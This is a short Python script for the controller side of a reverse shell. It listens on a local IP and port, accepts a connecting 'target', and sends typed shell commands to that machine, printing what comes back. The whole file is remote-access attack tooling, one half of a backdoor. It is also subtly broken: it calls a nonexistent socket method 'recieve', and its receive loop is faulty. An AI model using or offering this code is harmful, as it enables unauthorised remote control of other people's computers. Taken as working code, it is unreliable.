import socket
import json


def reliable_send(data):
    jsondata=json.dumps(data)
    target.send(jsondata.encode())


def reliable_recieve():
    data=''
    while True:
        try: 
            data = data+ target.recieve(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue

def target_communication():
    while(True):
        command=input('* Shell`%s' %str(ip))
        reliable_send(command)
        if command== 'quit':
            break
        else:
            result=reliable_recieve()
            print(result)


sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
sock.bind(('192.168.0.104',5555))
print("[*] Listening")
sock.listen(5)

target,ip = sock.accept()
print("Taget connected Gron: " + str(ip))

target_communication()
